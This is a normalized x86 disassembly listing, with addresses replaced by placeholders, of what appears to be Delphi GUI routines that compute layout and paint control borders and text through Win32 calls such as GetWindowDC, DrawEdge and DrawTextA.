mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_442e46
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_43f0fc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_442a00
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_43f0c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_442e5d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_442a84
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43cc34
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_442e9c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43dab8
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43b534
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_442ee4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43dcd8
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_442f14
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4426d0
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_43ec64
xor ecx ecx
push ebp
push sub_443043
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_43f0fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f0fc
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44304a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43ec6c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43f0c0
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44304a
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403420
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403420
jmp r-xdata
sub_4430e0
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43cd98
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43cd98
sub_443124
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_43cd98
sub_443174
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_443204
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44346a
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41ccc4
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42bf68
call sub_42c048
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42bf68
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42c660
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4434ac
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43b710
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43fcb8
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43cd98
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_43df5c
sub_443518
push ebx
push esi
mov esi edx
call sub_452980
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406814
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43cd98
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406814
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43cd98
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_44357c
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_440080
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4435b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4435ac
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4435f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43accc
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43a7a8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_443650
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43ada4
test bl bl
jle r-xdata
xor eax eax
call sub_438d9c
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_443690
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d0e4
xor eax eax
push ebp
push sub_44372b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d5b0
xor eax eax
push ebp
push sub_443708
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44370f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41d5b0
retn
sub_44373c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444030
mov edx 0x80ffff
mov eax esi
call sub_43bd6c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41d450
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41cdac
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_4437a8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43f258
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bc20
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43f1f0
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_443814
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44386a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443871
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call ReleaseDC
retn
sub_443878
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_443911
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41c4c4
mov eax ebx
call sub_43df04
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x14 ]
call sub_40441c
push eax
mov eax [ ebx + 0x208 ]
call sub_41d530
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443918
lea eax [ ebp - 0x14 ]
call sub_403f5c
retn
sub_443920
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_44398c
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_443a17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443a1e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f80
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43bbcc
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41d390
mov edx eax
add edx 0x6
mov eax esi
call sub_43b388
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43bbcc
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41d3ac
mov edx eax
add edx 0x4
mov eax esi
call sub_43b3ac
sub_443a24
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_443bfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43bbfc
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43ce3c
mov eax [ esi ]
